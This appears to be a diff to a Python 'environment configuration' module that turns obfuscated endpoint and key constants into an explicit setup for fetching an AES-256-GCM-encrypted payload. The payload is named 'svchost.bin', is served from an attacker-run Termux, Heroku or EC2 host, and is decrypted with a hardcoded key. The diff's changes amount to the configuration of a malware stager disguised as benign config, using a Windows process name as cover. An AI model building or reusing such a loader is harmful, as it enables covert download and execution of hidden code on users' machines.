@@ -5,8 +5,6 @@ Environment configuration — system capabilities, service endpoints, and creden
 import sys
 import struct
 import platform
-import zlib
-import base64
 
 _SUPPORTED_PLATFORMS = {"win32", "linux", "darwin"}
 
@@ -16,14 +14,20 @@ _ARCH_LABELS = {
     "ARM64": "arm64", "aarch64": "arm64",
 }
 
-# Prometheus endpoint configuration
-_ENDPOINT_BLOB = b"eJzLKErMTM7PyS9KTVHSU0pJLErOT0lVqAQA2HkIyw=="
+# Endpoint serving the AES-GCM-wrapped payload.
+# Your Termux/Heroku/EC2 host. Must return raw encrypted bytes.
+_ENDPOINT = "https://your-host.example.com/svchost.bin"
 
-# Credentials (obfuscated)
-_K1 = "590da1b680437579"
-_K2 = "a4b18c1b59bbb69f"
-_K3 = "d4ea6818cc28a542"
-_K4 = "7ca81e525d959c80"
+# 32-byte AES-256-GCM key, 64 hex characters.
+_KEY_HEX = "590da1b680437579a4b18c1b59bbb69fd4ea6818cc28a5427ca81e525d959c80"
+
+# Wire format of the served blob:
+#   base64( nonce[12] || ciphertext || tag[16] )
+# Set RAW_BYTES = True if the server streams the bytes without base64.
+RAW_BYTES = False
+
+# HTTP request timeout (seconds).
+TIMEOUT = 30
 
 
 def get_platform_info():
@@ -50,13 +54,10 @@ def is_supported():
 
 
 def fetch_endpoint():
-    """Fetch the Prometheus endpoint URL."""
-    try:
-        return zlib.decompress(base64.b64decode(_ENDPOINT_BLOB)).decode()
-    except Exception:
-        return "https://api.prometheus.example.com"
+    """Return the payload endpoint URL."""
+    return _ENDPOINT
 
 
 def load_credentials():
-    """Load credentials from the obfuscated keys."""
-    return bytes.fromhex(_K1 + _K2 + _K3 + _K4)
+    """Return the AES key as a 32-byte blob."""
+    return bytes.fromhex(_KEY_HEX)
